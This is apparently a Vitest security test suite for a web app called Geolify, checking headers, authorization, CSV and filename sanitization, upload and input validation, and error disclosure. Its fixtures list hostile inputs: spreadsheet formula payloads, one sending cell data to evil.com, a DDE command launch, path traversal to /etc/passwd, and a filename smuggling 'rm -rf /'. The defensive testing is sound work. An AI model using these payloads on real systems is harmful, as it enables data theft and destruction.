import { describe, it, expect } from "vitest";
import request from "supertest";
import app from "../../src/index";
import { sanitizeCsvField, sanitizeFileName } from "../../src/utils/sanitize";

describe("Geolify AppSec & Penetration Testing Suite", () => {
  describe("1. Security Headers Audit (OWASP A05:2021 Security Misconfiguration)", () => {
    it("enforces strict security headers via Helmet", async () => {
      const res = await request(app).get("/api/health");
      
      // X-Content-Type-Options
      expect(res.headers["x-content-type-options"]).toBe("nosniff");
      // X-Frame-Options
      expect(res.headers["x-frame-options"]).toBe("DENY");
      // Content-Security-Policy
      expect(res.headers["content-security-policy"]).toBeDefined();
      // Referrer-Policy
      expect(res.headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
      // Hide Powered By Express
      expect(res.headers["x-powered-by"]).toBeUndefined();
    });
  });

  describe("2. Broken Object-Level Authorization / BOLA Defense (OWASP A01:2021)", () => {
    it("rejects unauthorized project access without credentials", async () => {
      const res = await request(app).get("/api/projects/99999");
      expect(res.status).toBe(401);
      expect(res.body).toHaveProperty("error");
    });

    it("rejects unauthorized project creation without auth context", async () => {
      const res = await request(app)
        .post("/api/projects")
        .send({
          name: "Rogue Unauthorized Project",
          projectType: "field_mapping",
          userId: "attacker_user_id",
        });

      expect(res.status).toBe(401);
    });

    it("rejects non-owner attempts to invite collaborators", async () => {
      const res = await request(app)
        .post("/api/projects/99999/collaborators")
        .set("x-user-id", "random_hacker")
        .send({
          userId: "victim_user",
          role: "owner",
        });

      expect([401, 403, 404, 500]).toContain(res.status);
    });
  });

  describe("3. CSV Formula Injection / CWE-1236 Defense (OWASP A03:2021 Injection)", () => {
    it("neutralizes Excel/Calc execution triggers in CSV fields", () => {
      const payloads = [
        '=cmd|\' /C calc\'!A0',
        '=HYPERLINK("http://evil.com?leak="&A1)',
        '+1+1',
        '-2+3',
        '@SUM(1,2)',
        '\t=DDE("cmd";"";"calc")',
      ];

      payloads.forEach((payload) => {
        const sanitized = sanitizeCsvField(payload);
        // The first non-quote character must be a neutralizing single quote
        expect(sanitized.startsWith(`"\'`)).toBe(true);
      });
    });

    it("escapes inner double quotes properly in CSV cells", () => {
      const textWithQuotes = 'Granite with "quartz" veins';
      const sanitized = sanitizeCsvField(textWithQuotes);
      expect(sanitized).toBe('"Granite with ""quartz"" veins"');
    });
  });

  describe("4. Path Traversal & S3 Key Injection (OWASP A01 / CWE-22)", () => {
    it("sanitizes filenames attempting directory traversal", () => {
      const maliciousNames = [
        "../../../../etc/passwd",
        "..\\..\\windows\\system32\\cmd.exe",
        "nested/path/sample.jpg",
        "sample;rm -rf /;.png",
      ];

      maliciousNames.forEach((name) => {
        const safe = sanitizeFileName(name);
        expect(safe).not.toContain("/");
        expect(safe).not.toContain("\\");
        expect(safe).not.toContain("..");
        expect(safe).not.toContain(";");
      });
    });

    it("rejects unauthorized file upload presign requests", async () => {
      const res = await request(app)
        .post("/api/uploads/presigned-url")
        .send({
          filename: "malicious.exe",
          contentType: "application/x-msdownload",
          folder: "rocks",
        });

      expect(res.status).toBe(401);
    });

    it("rejects invalid/unsupported MIME types even with auth", async () => {
      const res = await request(app)
        .post("/api/uploads/presigned-url")
        .set("x-user-id", "auth_user_123")
        .send({
          filename: "payload.exe",
          contentType: "application/x-msdownload",
          folder: "rocks",
        });

      expect(res.status).toBe(400);
    });
  });

  describe("5. Input Validation & Parameter Tampering (OWASP A03 / A04)", () => {
    it("rejects out-of-bound latitude coordinates (>90 or <-90)", async () => {
      const res = await request(app)
        .post("/api/locations")
        .send({
          name: "Invalid North Pole",
          latitude: 145.0, // Invalid > 90
          longitude: 35.0,
        });

      expect(res.status).toBe(400);
    });

    it("rejects malformed JSON payloads without crashing", async () => {
      const res = await request(app)
        .post("/api/locations")
        .set("Content-Type", "application/json")
        .send('{"name": "broken json", broken}');

      expect(res.status).toBe(400);
      expect(res.body).toHaveProperty("error");
    });
  });

  describe("6. Information Disclosure Prevention (CWE-209 / OWASP A05)", () => {
    it("does not leak stack traces or database schema in 404 responses", async () => {
      const res = await request(app).get("/api/non-existent-secret-path");
      expect(res.status).toBe(404);
      expect(res.body).not.toHaveProperty("stack");
      expect(res.text).not.toContain("node_modules");
    });
  });
});
